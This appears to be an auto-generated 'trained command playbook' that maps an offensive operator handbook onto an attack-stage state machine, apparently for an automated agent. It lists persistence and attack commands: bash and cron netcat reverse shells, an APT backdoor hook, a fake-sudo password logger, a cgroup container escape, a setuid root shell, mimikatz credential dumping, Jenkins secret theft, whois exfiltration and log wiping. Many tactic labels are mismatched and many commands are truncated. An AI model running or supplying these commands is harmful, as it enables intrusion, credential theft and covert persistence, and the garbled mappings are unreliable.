---
title: "Trained Command Playbook: Operator-handbook-Search.Copy.Paste.pdf"
tags:
  - active_enum
  - adb
  - arp
  - aws
  - bloodhound
  - covert_exfil
  - covert_infil
  - credential_access
  - curl
  - cve-2010-3904
  - cve-2010-4258
  - cve-2012-0056
  - cve-2016-5195
  - defense_evasion_firewall
  - docker
  - enumeration
  - eth0
  - eth1
  - initial_access_exploitation
  - lateral_movement_routing_pivot
  - mdp
  - pdf
  - trained
source_file: Operator-handbook-Search.Copy.Paste.pdf
updated: 2026-10-25 00:59:33
---

# Trained Command Playbook: `Operator-handbook-Search.Copy.Paste.pdf`

- **Source Document:** `~/Projects/CORA/Training/Operator-handbook-Search.Copy.Paste.pdf`
- **CEGAR Verified Commands:** `1835` (`3` malformed/unsafe snippets filtered)
- **MDP Tactical Transitions (`Tactic -> Technique -> Tool -> Command`):** `1835`
- **Discovered IPs/Subnets:** `0.0.0.0/0, 0.0.0.0/24, 1.1.1.1, 1.1.1.1/32, 1.1.1.2, 1.1.1.2/32, 1.2.3.4, 10.0.0.0, 10.0.0.0/16, 10.0.0.0/24, 10.0.0.0/8, 10.0.0.1, 10.0.0.10, 10.0.0.2, 10.0.0.4, 10.0.2.9, 10.10.0.1, 10.10.10.10, 10.255.255.255, 10.5.4.0/24, 10.68.35.150/32, 10.9.165.8, 10.92.21.17, 113.88.161.0/24, 113.88.161.215, 127.0.0.1, 127.0.0.12, 127.0.0.6, 127.0.0.8, 151.101.1.69, 151.101.129.69, 151.101.193.69, 151.101.65.69, 172.16.0.0, 172.16.0.0/12, 172.17.0.8, 172.31.255.255, 185.30.20.0/24, 185.30.20.1, 185.30.20.1/24, 192.167.0.0/24, 172.24.0.0, 172.24.0.0/16, 172.24.0.0/24, 172.24.0.1, 172.24.0.32, 172.24.0.5, 172.24.1.0/24, 172.24.1.1, 172.24.1.10, 172.24.1.2, 172.24.1.200, 172.24.1.23, 172.24.1.254, 172.24.1.34, 172.24.111.0/24, 172.24.150.0/24, 172.24.154.228, 172.24.252.128, 172.24.255.255, 172.24.80.107, 194.134.109.48, 198.108.0.0/16, 255.0.0.0, 255.128.0.0, 255.192.0.0, 255.224.0.0, 255.240.0.0, 255.248.0.0, 255.252.0.0, 255.254.0.0, 255.255.0.0, 255.255.128.0, 255.255.192.0, 255.255.224.0, 255.255.240.0, 255.255.248.0, 255.255.252.0, 255.255.254.0, 255.255.255.0, 255.255.255.128, 255.255.255.192, 255.255.255.224, 255.255.255.240, 255.255.255.248, 255.255.255.252, 255.255.255.254, 30.0.0.0/16, 45.33.87.74, 52.32.74.91, 54.179.178.214, 8.0.0.0, 8.0.0.0/8, 8.255.255.255, 8.8.0.0, 8.8.0.0/16, 8.8.255.255, 8.8.8.0, 8.8.8.0/24, 8.8.8.255`
- **Discovered Interfaces:** `Lo, eth0, eth1, eth2, lo, tun0`
- **Related Knowledge Note:** [[knowledge/trained_operator-handbook-search_copy_paste]]

## Distilled MDP Tactical Transitions (`Tactic -> Technique -> Tool -> Command`)
| Pre-State ($s$) | Tactic ($\tau$) | Technique ($k$) | Tool ($u$) | Post-State ($s'$) | Verified Command ($c$) |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `s_passive_topology_mapped` | **`Active_Enum`** | Active Network, Cloud, Directory Service & Endpoint Probing | `adb` | `s_active_services_enumerated` | `adb devices` |
| `s_init_unknown` | **`Passive_Enum`** | Local Host State, Memory/Artifact Forensics, Process, Registry & Socket Survey | `adb` | `s_passive_topology_mapped` | `adb shell ls -s` |
| `s_protocol_chain_established` | **`Covert_Infil`** | Staged Artifact / Encapsulated Ingress Delivery | `ansible-playbook` | `s_covert_infil_channel_ready` | `ansible-playbook <YAML>` |
| `s_init_unknown` | **`Reconnaissance`** | Domain, DNS, OSINT & Target Footprint Reconnaissance | `ansible-playbook` | `s_passive_topology_mapped` | `ansible-playbook <YAML> -f` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `ansible-galaxy` | `s_active_services_enumerated` | `ansible-galaxy search` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `ansible-vault` | `s_credentials_or_certs_acquired` | `ansible-vault create` |
| `s_oob_serial_enumerated` | **`Defense_Evasion_Firewall`** | Host Firewall, Audit Policy, LOLBin & Integrity Control Adjustment | `aws` | `s_firewall_or_acl_unlocked` | `aws ec2 authorize-security-group-ingress --group-id sg-0000000 --protocol tcp --port 80 --cidr 0.0.0.0/24` |
| `s_active_services_enumerated` | **`Initial_Access_Exploitation`** | Structured Query / Payload / Web API Endpoint Exploitation | `aws` | `s_initial_shell_or_api_access` | `aws ec2 create-traffic-mirror-filter --description "TCP Filter"` |
| `s_cross_subnet_pivot_routed` | **`Post_Exploitation_Verification`** | Post-Action Host Identity, Privilege & Objective Verification | `get-allgroups` | `s_goal_verified_complete` | `Get-AllGroups` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `get-allsecrets` | `s_covert_exfil_verified` | `Get-AllSecrets` |
| `s_initial_shell_or_api_access` | **`Privilege_Escalation`** | ACL/Permission Modification, Service Abuse & Privilege Escalation | `chmod` | `s_interactive_tty_or_priv_escalated` | `chmod a+x /cmd` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `python` | `s_cross_subnet_pivot_routed` | `python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass` |
| `s_l2_l3_verified` | **`Out-of-Band_Access`** | UART/Serial Console Out-of-Band Enumeration & Control | `whois` | `s_oob_serial_enumerated` | `whois -h whois.radb.net -- '-i origin AS36459' \| grep -Eo "([0- 9.]+){4}/[0-9]+" \| uniq` |
| `s_credentials_or_certs_acquired` | **`Protocol_Chaining`** | Multi-Protocol Handshake & Tunnel Relay Chaining | `curl` | `s_protocol_chain_established` | `curl -s https://api.ipify.org && echo` |
| `s_passive_topology_mapped` | **`Active_Enum`** | Active Network, Cloud, Directory Service & Endpoint Probing | `adb` | `s_active_services_enumerated` | `adb root` |
| `s_init_unknown` | **`Passive_Enum`** | Local Host State, Memory/Artifact Forensics, Process, Registry & Socket Survey | `adb` | `s_passive_topology_mapped` | `adb shell ls -R` |
| `s_protocol_chain_established` | **`Covert_Infil`** | Staged Artifact / Encapsulated Ingress Delivery | `echo` | `s_covert_infil_channel_ready` | `echo '<base64_username_string>' \| base64 -decode` |
| `s_init_unknown` | **`Reconnaissance`** | Domain, DNS, OSINT & Target Footprint Reconnaissance | `ansible-playbook` | `s_passive_topology_mapped` | `ansible-playbook <YAML> --verbose` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `ssh-keygen` | `s_active_services_enumerated` | `ssh-keygen -t rsa -b 4096` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `ansible-vault` | `s_credentials_or_certs_acquired` | `ansible-vault view newfile` |
| `s_oob_serial_enumerated` | **`Defense_Evasion_Firewall`** | Host Firewall, Audit Policy, LOLBin & Integrity Control Adjustment | `aws` | `s_firewall_or_acl_unlocked` | `aws ec2 authorize-security-group-ingress --group-id sg-0000000 --protocol tcp --port 80 --cidr <my_ip>/32` |
| `s_active_services_enumerated` | **`Initial_Access_Exploitation`** | Structured Query / Payload / Web API Endpoint Exploitation | `git` | `s_initial_shell_or_api_access` | `git clone git@github.com:andresriancho/nimbostratus.git` |
| `s_cross_subnet_pivot_routed` | **`Post_Exploitation_Verification`** | Post-Action Host Identity, Privilege & Objective Verification | `echo` | `s_goal_verified_complete` | `echo '10.0.2.9' > targets.txt` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `get-storageaccounts` | `s_covert_exfil_verified` | `Get-StorageAccounts` |
| `s_initial_shell_or_api_access` | **`Privilege_Escalation`** | ACL/Permission Modification, Service Abuse & Privilege Escalation | `adb` | `s_interactive_tty_or_priv_escalated` | `adb shell "su -c 'chmod 755 /data/local/tmp/frida-server'"` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `python` | `s_cross_subnet_pivot_routed` | `python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass` |
| `s_l2_l3_verified` | **`Out-of-Band_Access`** | UART/Serial Console Out-of-Band Enumeration & Control | `tmux` | `s_oob_serial_enumerated` | `tmux info` |
| `s_credentials_or_certs_acquired` | **`Protocol_Chaining`** | Multi-Protocol Handshake & Tunnel Relay Chaining | `bash` | `s_protocol_chain_established` | `bash -i >& /dev/tcp/10.0.0.1/4242 0>&1` |
| `s_passive_topology_mapped` | **`Active_Enum`** | Active Network, Cloud, Directory Service & Endpoint Probing | `adb` | `s_active_services_enumerated` | `adb start-server` |
| `s_init_unknown` | **`Passive_Enum`** | Local Host State, Memory/Artifact Forensics, Process, Registry & Socket Survey | `adb` | `s_passive_topology_mapped` | `adb shell netstat` |
| `s_protocol_chain_established` | **`Covert_Infil`** | Staged Artifact / Encapsulated Ingress Delivery | `curl` | `s_covert_infil_channel_ready` | `curl <URL> -O` |
| `s_init_unknown` | **`Reconnaissance`** | Domain, DNS, OSINT & Target Footprint Reconnaissance | `ansible-playbook` | `s_passive_topology_mapped` | `ansible-playbook <YAML> -C` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `nimbostratus` | `s_active_services_enumerated` | `nimbostratus -v create-iam-user --access-key **************UFUA --secret-key **************************************DDxSZ --token` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `ansible-vault` | `s_credentials_or_certs_acquired` | `ansible-vault edit newfile` |
| `s_oob_serial_enumerated` | **`Defense_Evasion_Firewall`** | Host Firewall, Audit Policy, LOLBin & Integrity Control Adjustment | `aws` | `s_firewall_or_acl_unlocked` | `aws ec2 revoke-security-group-ingress --group-id sg-0000000 --protocol tcp --port 80 --cidr 0.0.0.0/24` |
| `s_active_services_enumerated` | **`Initial_Access_Exploitation`** | Structured Query / Payload / Web API Endpoint Exploitation | `pip` | `s_initial_shell_or_api_access` | `pip install -r requirements.txt` |
| `s_cross_subnet_pivot_routed` | **`Post_Exploitation_Verification`** | Post-Action Host Identity, Privilege & Objective Verification | `last` | `s_goal_verified_complete` | `last -a` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `get-storageaccountkeys` | `s_covert_exfil_verified` | `Get-StorageAccountKeys` |
| `s_initial_shell_or_api_access` | **`Privilege_Escalation`** | ACL/Permission Modification, Service Abuse & Privilege Escalation | `chmod` | `s_interactive_tty_or_priv_escalated` | `chmod ugo file` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `python` | `s_cross_subnet_pivot_routed` | `python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass` |

## Verified Executable Commands (Grouped by Capability Layer)

### General_System (1173 commands)
```bash
adb devices
adb root
adb start-server
adb kill-server
adb reboot
adb devices -l
adb shell
adb help
adb -s <deviceName> <command>
adb -d <command>
adb -e <command>
adb shell install <apk>
adb shell install <path>
adb shell install -r <path>
adb shell uninstall <name>
adb shell ls
adb shell ls -s
adb shell ls -R
adb push <local> <remote>
adb pull <remote> <local>
adb get-stat–µ
adb get-serialno
adb shell dumpsys iphonesybinfo
adb shell netstat
adb shell pwd
adb shell dumpsys battery
adb shell pm list features
adb shell service list
adb shell dumpsys activity
adb shell ps
adb shell wm size
adb shell list packages
adb shell list packages -r
adb shell list packages -3
adb shell list packages -s
adb shell list packages -u
adb shell dumpsys package packages
adb shell dump <name>
adb shell path <package>
adb shell dumpsys battery set level <n>
adb shell dumpsys battery set status<n>
adb shell dumpsys battery reset
adb shell dumpsys battery set usb <n>
adb shell wm size WxH
adb reboot-recovery
adb reboot fastboot
adb shell screencap -p
adb shell screenrecord
adb backup -apk -all -f backup.ab
adb backup -apk -shared -all -f backup.ab
adb backup -apk -nosystem -all -f backup.ab
adb restore backup.ab
adb shell am start|startservice|broadcast
adb shell am start -a
adb shell am start -t image/* -a
adb logcat [options] [filter] [filter]
adb bugreport
adb shell permissions groups
adb shell list permissions -g -r
ansible-playbook <YAML>
ansible-playbook <YAML> -f
ansible-playbook <YAML> --verbose
ansible-playbook <YAML> -C
ansible-playbook <YAML> -C -D
ansible-playbook <YAML> -l
ansible-galaxy search
ansible-galaxy info <role-name>
ansible-galaxy install
ansible-galaxy list
ansible-galaxy remove
ansible-galaxy init --offline <role-name>
ansible-vault create
ansible-vault view newfile
ansible-vault edit newfile
ansible-vault view --vault-password-
ansible-vault decrypt
ansible-vault rekey
git clone git@github.com:andresriancho/nimbostratus.git
pip install -r requirements.txt
nimbostratus -v dump-ec2-metadata --mangle-
nimbostratus -v dump-credentials --mangle-
nimbostratus  dump-permissions --access-key=**************PXXQ --secret-key=*****************************SUW --token
nimbostratus -v create-iam-user --access-key **************UFUA --secret-key **************************************DDxSZ --token
nimbostratus -v snapshot-rds --access-key ********AUFUA --secret-
bash install.sh
python3 pacu.py
Install-Module -Name AzureRM
Install-Module -Name Azure
Import-Module .\Get-AzurePasswords.ps1
Get-AzurePasswords -Verbose | Export-CSV
Set-Subscription
Stop-VM
Start-VM
Restart-VM
Start-Runbook
Set-Role
Remove-Role
Set-Group
Get-CurrentUser
Get-AllUsers
Get-User
Get-AllGroups
Get-Resources
Get-Apps
Get-GroupMembers
Get-AllGroupMembers
Get-AllRoleMembers
Get-Roles
Get-RoleMembers
Get-Sps
Get-Sp
Get-AppPermissions
Get-WebApps
Get-WebAppDetails
Get-KeyVaults
Get-KeyVaultContents
Get-AllKeyVaultContents
Get-AppSecrets
Get-AllAppSecrets
Get-AllSecrets
Get-
Get-StorageAccounts
Get-StorageAccountKeys
Get-StorageContents
Get-Runbooks
Get-RunbookContent
Get-AvailableVMDisks
Get-VMDisk
Get-VMs
Find groups that can reset passwords (Warning: Heavy)
Find groups that have local admin rights (Warning: Heavy)
ls <C:\Path>
mimikatz [module::command] <args>
Mimikatz !module:: elevate to
sekurlsa::logonpasswords
script from the control
net view
net computers
net localgroup \\TARGET
net localgroup \\TARGET group
sudo [password] [cmd + arguments]
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
go get -u -v github.com/atredispartners/flamingo && \
adb shell "su -c 'chmod 755 /data/local/tmp/frida-server'"
adb shell "su -c '/data/local/tmp/frida-server' &"
frida-trace -U -i open com.android.chrome
frida -U <APP NAME>
frida Calculator -l calc.js
frida-ps -U
frida-ps -Ua
frida-ps -Uai
frida-ps -D 0216027d1d6d3a03
frida -U -f com.htbridge.pivaa -l ~/bin/proxies/scriptBrida.js --no-pause
frida -q -U evilapp -e
frida --codeshare pcipolloni/universal-android-ssl-pinning-bypass-
frida --codeshare segura2010/android-certificate-pinning-bypass -f
frida --codeshare sowdust/universal-android-ssl-pinning-bypass-2 -f
frida --codeshare dzonerzy/fridantiroot -f YOUR_BINARY
frida --codeshare mrmacete/objc-method-observer -f YOUR_BINARY
frida --codeshare razaina/get-a-stack-trace-in-your-hook -f
frida --codeshare tiiime/android-network-security-config-bypass -f
frida --codeshare ceres-c/extract-keystore -f YOUR_BINARY
frida --codeshare SYM01/ios-backtrace-http-req -f YOUR_BINARY
frida --codeshare platix/ios-trustkit-ssl-unpinning -f YOUR_BINARY
frida --codeshare lichao890427/ios-ssl-bypass -f YOUR_BINARY
frida --codeshare machoreverser/ios12-ssl-bypass -f YOUR_BINARY
frida --codeshare snooze6/ios-pinning-disable -f YOUR_BINARY
frida --codeshare snooze6/everything -f YOUR_BINARY
DIR ~/LOCAL-DIR --zone us-central1-a
python scout.py --provider gcp --user-account
python scout.py --provider gcp --service-account --key-file
Script Manager
git config --global user.name "[name]"
git config --global user.email "[email address]"
git config --global color.ui auto
git init
git clone [url] or [/path] or [user@host:/path]
git branch [branch-name]
git checkout [branch-name]
git merge [branch]
git branch -d [branch-name]
git push origin [branch]
git fetch
git merge
git push
git pull
git log
git log --follow [file]
git diff [branch-1]…[branch-2]
git show [commit]
git add [file]
git rm [file]
git commit -m "[description text]"
git reset [commit]
git reset --hard [commit]
git checkout --[file]
gh issue create
gh issue create --title "Issue title" --body "Issue body"
gh issue create --web
gh issue list
gh issue list --state closed --assignee user
gh issue status
gh issue view <issue_number>
gh issue view <issue_number> --preview
gh pr checkout {<number> | <url> | <branch>} [flags]
gh pr checkout <number>
gh pr checkout branch-name
gh pr create
gh pr create --title "Pull request title" --body "Pull request body"
gh pr create --web
gh pr list
gh pr list --state closed --assignee user
gh pr status
gh pr view <number>
gh pr view <number> --preview
pip install truffleHog
pip install greynoise or python setup.py install
greynoise setup --api-key <your-API-key>
cat ips.txt | greynoise filter > non-noise-ips.txt
cat ips.txt | greynoise analyze
greynoise stats "ip:113.88.161.0/24 classification:malicious"
greynoise query "ip:<IPAddr or CIDR>"
greynoise query "ip:113.88.161.215"
greynoise query "113.88.161.0/24"
greynoise query "classification:<type>"
greynoise query "classification:malicious"
greynoise query "ip:113.88.161.0/24 classification:malicious"
greynoise query "first_seen:<YYYY-MM-DD>"
greynoise query "first_seen:2026-10-25"
greynoise query "ip:113.88.161.0/24 first_seen: 2026-10-25"
greynoise query "last_seen:<YYYY-MM-DD>"
greynoise query "last_seen:2026-10-25"
greynoise query "ip:113.88.161.0/24 last_seen:2026-10-25"
greynoise query "actor:<actor>"
greynoise query "actor:censys"
greynoise query "198.108.0.0/16 actor:censys"
greynoise query "tags:<tag string>"
greynoise query "tags:avtech"
greynoise query "tags:avtech metadata.asn:AS17974"
greynoise query "metadata.category:<category string>"
greynoise query "metadata.category:ISP"
greynoise query "metadata.category:ISP actor:Yandex"
greynoise query "metadata.country:<country>"
greynoise query "metadata.country:turkey"
greynoise query "metadata.country_code:<##>"
greynoise query "metadata.country_code:RU"
greynoise query "metadata.country_code:RU classification:benign"
greynoise query "metadata.city:<city string>"
greynoise query "metadata.city:moscow"
greynoise query "metadata.city:moscow tags:SMB Scanner"
greynoise query "metadata.organization:<string>"
greynoise query "metadata.organization:Yandex"
greynoise query "metadata.organization:Yandex tags:DNS Scanner"
greynoise query "metadata.rdns:<dns string>"
greynoise query "metadata.rdns:*yandex*"
greynoise query "metadata.rdns:*yandex* tags:Web Crawler"
greynoise query "metadata.asn:<AS#####>"
greynoise query "metadata.asn:AS17974"
greynoise query "metadata.tor:<true>"
greynoise query "metadata.tor:true"
greynoise query "metadata.tor:true metadata.country:sweden"
greynoise query "raw_data.scan.port:<port number>"
greynoise query "raw_data.scan.port:23"
greynoise query "raw_data.scan.port:23 metdata.country:sweden"
greynoise query "raw_data.scan.protocol:<tcp/udp>"
greynoise query "raw_data.scan.protocol:udp"
greynoise query "raw_data.web.paths:<path string>"
greynoise query "raw_data.web.paths:*admin*"
greynoise query "raw_data.web.paths:*admin* tags:Jboss Worm"
greynoise query "raw_data.web.useragents:<UA string>"
greynoise query "raw_data.ja3.fingerprint:<JA3 fingerprint hash>"
hashcat -a 0 -m #type hash.txt dict.txt
hashcat -a 0 -m #type hash.txt dict.txt -r rule.txt
hashcat -a 1 -m #type hash.txt dict1.txt dict2.txt
hashcat -a 3 -m #type hash.txt ?a?a?a?a?a?a
hashcat -a 6 -m #type hash.txt dict.txt ?a?a?a?a
hashcat -a 7 -m #type hash.txt ?a?a?a?a dict.txt
hashcat -a 1 -m #type hash.txt left_dict.txt right_dict.txt -j
hashcat -a 1 -m #type hash.txt left_dict.txt right_dict.txt -k
hashcat -a 3 -m #type hash.txt ?a?a?a?a?a --increment
hashcat -a 3 -m #type hash.txt ?a?a?a?a?a --increment-min=4
hashcat -a 3 -m #type hash.txt ?a?a?a?a?a?a --increment-max=5
hashcat -b -m #type
hashcat -m #type --example-hashes
hashcat -a 0 -m #type -O hash.txt dict.txt
hashcat -a 0 -m #type -S hash.txt dict.txt
hashcat -a 0 -m #type --session <uniq_name> hash.txt dict.txt
hashcat -a 0 -m #type --restore --session <uniq_name> hash.txt
hashcat -a 0 -m #type --keyspace hash.txt dict.txt -r rule.txt
hashcat -a 0 -m #type -o results.txt hash.txt dict.txt
hashcat -a 3 -m #type hash.txt -1 ?l?u -2 ?l?d?s ?1?2?a?d?u?l
hashcat -a 0 -m #type -w <1-4> hash.txt dict.txt
hashcat -a 0 -m #type --keyb=german.hckmap hash.txt dict.txt
hashcat -a 3 -m #type hash.txt ?a?a?a?a?a?a?a?a
python GetNPUsers.py
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format
python GetUserSPNs.py
python getTGT.py <domain_name>/<user_name> -hashes
python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
python getTGT.py <domain_name>/<user_name>:[password]
export KRB5CCNAME=<TGT_ccache_file>
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
export KRB5CCNAME=<TGT_ccache_file_path>
python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
export KRB5CCNAME=<TGS_ccache_file>
python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
echo '10.0.2.9' > targets.txt
ntlmrelayx.py -tf targets.txt ./payload.exe
echo ""
echo "credentials.xml"
cat ${JENKINS_HOME}/credentials.xml
echo "master.key"
cat ${JENKINS_HOME}/secrets/master.key | base64 -w 0
echo "hudson.util.Secret"
cat ${JENKINS_HOME}/secrets/hudson.util.Secret | base64 -w 0
echo <base64 string master.key> | base64 --decode > master.key
echo <base64 string hudson.util.Secret> | base64 --decode >
john --format=#type hash.txt
john --format=#type --wordlist=dict.txt hash.txt
john --format=#type --mask=?l?l?l?l?l?l hash.txt -min-len=6
john --incremental hash.txt
john --format=#type --wordlist=dict.txt --rules
john --list=opencl-devices
john --list=formats --format=opencl
john --format=<OpenCLformat> hash.txt --wordlist=dict.txt --rules - -dev=<#> --fork=3
john --wordlist=dict.txt hash.txt --rules --dev=<#> --fork=8
john --test
john hash.txt --session=example_name
john --restore=example_name
john hash.txt --pot=<john potfile> --show
john --wordlist=dict.txt --stdout --external:[filter name] >
john hash.txt
john --wordlist=dict.txt --rules
john --mask=?l?l?l?l?l?l hash.txt -min-len=6
jq - jq is a fantastic command-line JSON processor. jq is a sed-
cat file.json | jq
cat file.json | jq '.name'
cat file.json | jq '.owner.name'
cat file.json | jq '.likes[0]'
cat file.json | jq '.[] | .name'
cat file.json | jq '[.name, .likes[]]'
cat file.json | jq '.eggs + 1'
cat file.json | jq 'del(.name)'
echo '[12,14,15]' | jq 'map(.-2)'
echo '<base64_username_string>' | base64 -decode
echo '<base64_password_string>' | base64 --decode
cat /run/secrets/kubernetes.io/serviceaccount/token
ls -l
ls -a
ls -F
mkdir dir
rm -r dir
cp -r dir1 dir2
mv file1 file2
ln -s file link
tail -f file
vim file
cat /etc/*release*
cat /etc/issue
cat /proc/version
date
last -a
mount
uname -a
whereis app
which app
who -a
whoami
ps -aef
kill pid#
kill -9 pid#
echo "1" >
echo "nameserver <IP>" >
lsof -i
lsof -i tcp:80
smbclient -U <USER>
ls -lart
chmod ugo file
chmod 600 file
chmod 700 file
chmod 644 file
chmod 755 file
dig -x host
dig domain.com
script -a file.txt
whois domain.com
grep pattern files
grep -r pattern dir
grep -rn pattern dir
locate file
sed -i 's/day/night/g' file
tar cf file.tar files
tar xf file.tar
tar czf file.tar.gz files
tar xzf file.tar.gz
gzip file
gzip -d file.gz
zip -r <file.zip> \path\*
hostname
lsmod
fdisk -l
who
last
cat /var/log/auth.log
cat /etc/passwd
cat /etc/shadow
cat /etc/sudoers
cat /etc/sudoers.d/*
cut -d: -f1 /etc/passwd
ps -s
ps -l
ps -o
ps -t
ps -m
ps -a
ps -auxwf
strace -f -e trace=network -s 10000 <PROCESS WITH ARGUMENTS>;
strace -f -e trace=network -s 10000 -p <PID>;
cat /etc/profile
ls /etc/profile.d/
cat /etc/profile.d/*
ls /etc/cron.*
ls /etc/cron.*/*
cat /etc/cron.*/*
cat /etc/crontab
ls /etc/*.d
cat /etc/*.d/*
cat /etc/bash.bashrc
cat ~/.bash_profile
cat ~/.bashrc
ls -la /lib/modules/*/kernel/*
ls -la ~/.mozilla/plugins
ls -la /usr/lib/mozilla/plugins
ls -la /usr/lib64/mozilla/plugins
ls -la ~/.config/google-chrome/Default/Extensions/
cat /etc/pam.d/sudo
cat /etc/pam.conf
ls /etc/pam.d/
find / -type d -name ".*"
find / -type f \( -perm -04000 -o -perm -02000 \) -exec ls -lg {}
find / \( -nouser -o -nogroup \) -exec ls -lg  {} \;
find / -type f -exec file -p '{}' \; |  grep ELF
find / -name ".*" -exec file -p '{}' \; | grep ELF
find / -mtime -1
ls -al /var/log/*
ls -al /var/log/*tmp
utmpdump /var/log/btmp
utmpdump /var/run/utmp
utmpdump /var/log/wtmp
ls -al /proc/[PID]
cp /proc/[PID]/exe /[destination]/[binaryname]
cp /proc/[PID]/ /[destination]/[PID]/
cat /proc/[PID]/cmdline
cat /proc/[PID]/comm
strings /proc/[PID]/environ
cat /proc/[PID]/environ
ls -al /proc/[PID]/fd
cat /proc/[PID]/maps
cat /proc/[PID]/stack
cat /proc/[PID]/status
ls -alr /proc/*/exe 2> /dev/null | grep deleted
ls -alr /proc/*/cwd
ls -alr /proc/*/cwd 2> /dev/null | grep tmp
ls -alr /proc/*/cwd 2> /dev/null | grep dev
ls -alr /proc/*/cwd 2> /dev/null | grep var
ls -alr /proc/*/cwd 2> /dev/null | grep home
dd if=/dev/kmem of=/root/kmem
dd if=/dev/mem of=/root/mem
sudo insmod ./lime.ko "path=./Linmen.mem format=raw"
dd if=/dev/sda1 of=/[outputlocation]
Sudo list
python beroot.py
python beroot.py --password <PASS>
Sudo related tests.
gcc -o mempodipper exploit.c
./mempodipper
gcc -m32 -o hello_32 hello.c
gcc -m64 -o hello_64 hello.c
sudo useradd -ou 0 -g 0 john
sudo passwd john
echo "linuxpassword" | passwd --stdin john
echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' >
gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2>/dev/null
chown root:root $TMPDIR2/croissant
chmod 4777 $TMPDIR2/croissant
Crontab - Reverse shell
cat << EOF > /tmp/$TMPNAME2
cat /tmp/$TMPNAME2 >> ~/.bashrc
cat /tmp/$TMPNAME2 >> ~/.zshrc
rm /tmp/$TMPNAME2
chmod u+x ~/.hidden/fakesudo
echo "alias sudo=~/.hidden/fakesudo" >> ~./bashrc
echo "Sorry, try again."
echo $sudopass >> /tmp/pass.txt
sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor
cat /dev/null > /var/log/auth.log
cat /dev/null > ~/.bash_history
history -c
export HISTFILESIZE=0
export HISTSIZE=0
unset HISTFILE
Echo service
WHOIS directory service
Hostname services on SRI-NIC
whoami user ID listing
rsync file transfer services
MySQL database service
WHOIS Exfil Files
tar czf - /bin/* | base64 | xargs -I bits timeout 0.03 whois -h
cat files.b64 | tr -d '\r\n' | base64 -d | tar zxv
echo "* * * * * /bin/nc 172.24.1.10 1234 -e /bin/bash" > cron && crontab cron
find . -type f | sort | xargs sha1sum | sha1sum | awk '{print $1}'
whois -h whois.radb.net -- '-i origin AS36459' | grep -Eo "([0- 9.]+){4}/[0-9]+" | uniq
lsof / | awk '{ if($7 > 1048576) print $7/1048576 "MB" " " $9 " " $1 }' | sort -n -u | tail
echo {01..10}
find . -type f -mtime +1 -name "*.log" -exec zip -m {}.zip {} \;
find . -type f  -name '*.java' -exec sh -c 'iconv -f cp1252 -t utf- 8 "$1" > converted && mv converted "$1"' -- {} \;
ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e
find . -name *conf* -exec grep -Hni 'matching_text' {} \; >
dig +short myip.opendns.com @resolver1.opendns.com
groups
history
lsof
uname
uptime
Locate a program
xcode-select --install
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user
ldapsearch -H ldap://test.local -b DC=test,DC=local
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dsconfigad -show
strings -string decoder
otool -static disassembler
ls -al@ malware_file
codesign -dvvvv -r - malware_file.app/
spctl --verbose=4 --assess --type execute malware_file.app
strings - malware_file > malwareStrings.txt
otool -L malware_file >  malwareLibs.txt
